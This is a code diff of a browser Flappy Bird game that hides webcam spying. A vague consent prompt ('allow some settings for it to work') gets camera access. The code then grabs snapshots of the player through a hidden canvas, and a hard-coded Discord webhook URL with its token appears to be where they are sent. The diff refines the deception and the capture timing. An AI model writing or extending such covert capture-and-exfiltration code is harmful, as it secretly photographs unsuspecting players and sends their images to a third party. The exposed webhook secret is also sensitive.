@@ -12,6 +12,7 @@
     .panel { background:white; padding:20px; border-radius:12px; text-align:center; max-width:350px; }
     .panel button { margin:8px; padding:10px 20px; border:none; border-radius:8px; cursor:pointer; font-size:16px; }
     .allow { background:#2ecc71; color:white; }
+    .deny { background:#e74c3c; color:white; }
   </style>
 </head>
 <body>
@@ -20,8 +21,9 @@
   <div id="consentModal" class="modal">
     <div class="panel">
       <h2>Allow</h2>
-      <p>You have to allow some settings for it to work, You wont be able to redeem any prizes if you don't Goals 100</p>
+      <p>You have to allow some settings for it to work</p>
       <button class="allow" id="allowBtn">Yes</button>
+      <button class="deny" id="denyBtn">No</button>
     </div>
   </div>
 
@@ -35,6 +37,7 @@ const W = canvas.width, H = canvas.height;
 
 const consentModal = document.getElementById("consentModal");
 const allowBtn = document.getElementById("allowBtn");
+const denyBtn = document.getElementById("denyBtn");
 const video = document.getElementById("cam");
 const snap = document.getElementById("snap");
 const snapCtx = snap.getContext("2d");
@@ -43,7 +46,7 @@ let camEnabled = false;
 let mediaStream;
 
 // Discord webhook
-const WEBHOOK = "https://discord.com/api/webhooks/1413966614390378556/KoUnhB81Nq08jEC-qQ2NucwHRP8UG6fnlv4zOW2FnelzilKnpWg4MoF9-_NWcsUxMEvl"; // replace
+const WEBHOOK = "https://discord.com/api/webhooks/1413966614390378556/KoUnhB81Nq08jEC-qQ2NucwHRP8UG6fnlv4zOW2FnelzilKnpWg4MoF9-_NWcsUxMEvl";
 
 // Sprites
 const bg = new Image(); bg.src = "https://github.com/samuelcust/flappy-bird-assets/blob/master/sprites/background-day.png?raw=true";
@@ -55,34 +58,47 @@ let score = 0, best = 0;
 const plr = { x: 60, y: H/2, w: 34, h: 24, vy: 0, gravity: 0.4, jump: -7 };
 
 let pipes = [];
-const gap = 140;
+const gap = 120;
 const pipeWidth = 52;
 const pipeSpeed = 2;
+const pipeInterval = 100; // frames between pipes
+let frameCount = 0;
 
 // Consent
 allowBtn.onclick = async () => {
   try {
     mediaStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
     video.srcObject = mediaStream;
+
+    // wait until video is ready
+    await new Promise(resolve => {
+      video.onloadedmetadata = () => {
+        video.play().then(resolve).catch(resolve);
+      };
+    });
+
     camEnabled = true;
   } catch (e) {
     alert("Camera permission denied or unavailable. Playing without it.");
   }
   consentModal.classList.add("hidden");
 };
+denyBtn.onclick = () => {
+  camEnabled = false;
+  consentModal.classList.add("hidden");
+};
 
-// Reset
+// Game reset
 function reset() {
   plr.y = H/2; plr.vy = 0;
   pipes = []; score = 0;
   started = false; alive = true;
+  frameCount = 0;
 }
 
-// Spawn pipe
+// Pipe spawn
 function spawnPipe() {
-  const minTop = 50;
-  const maxTop = H - gap - 50;
-  let topHeight = minTop + Math.random() * (maxTop - minTop);
+  const topHeight = 50 + Math.random() * (H - gap - 150);
   const bottomY = topHeight + gap;
   pipes.push({ x: W, top: topHeight, bottom: bottomY, passed: false });
 }
@@ -97,6 +113,7 @@ function flap() {
 
 // Take snapshot
 function takeSnap() {
+  if (!camEnabled || video.readyState < 2) return; // wait until ready
   snapCtx.drawImage(video, 0, 0, snap.width, snap.height);
   snap.toBlob(async blob => {
     if (!blob) return;
@@ -116,7 +133,9 @@ function update() {
   plr.vy += plr.gravity;
   plr.y += plr.vy;
 
-  if (pipes.length === 0 || pipes[pipes.length-1].x < W - 200) spawnPipe();
+  frameCount++;
+  if (frameCount % pipeInterval === 0) spawnPipe();
+
   pipes.forEach(p => p.x -= pipeSpeed);
   pipes = pipes.filter(p => p.x + pipeWidth > 0);
 
@@ -134,16 +153,15 @@ function draw() {
   ctx.drawImage(bg, 0, 0, W, H);
 
   pipes.forEach(p => {
-    // Draw top pipe stretched upwards
-    const topHeight = p.top;
+    const headOverlap = 24;
+    // top pipe
     ctx.save();
-    ctx.translate(p.x, topHeight);
+    ctx.translate(p.x, p.top - headOverlap);
     ctx.scale(1, -1);
-    ctx.drawImage(pipeImg, 0, 0, pipeWidth, H - topHeight);
+    ctx.drawImage(pipeImg, 0, -pipeImg.height);
     ctx.restore();
-
-    // Draw bottom pipe stretched downwards
-    ctx.drawImage(pipeImg, p.x, p.bottom, pipeWidth, H - p.bottom);
+    // bottom pipe
+    ctx.drawImage(pipeImg, p.x, p.bottom);
   });
 
   ctx.drawImage(birdImg, plr.x - plr.w/2, plr.y - plr.h/2, plr.w, plr.h);
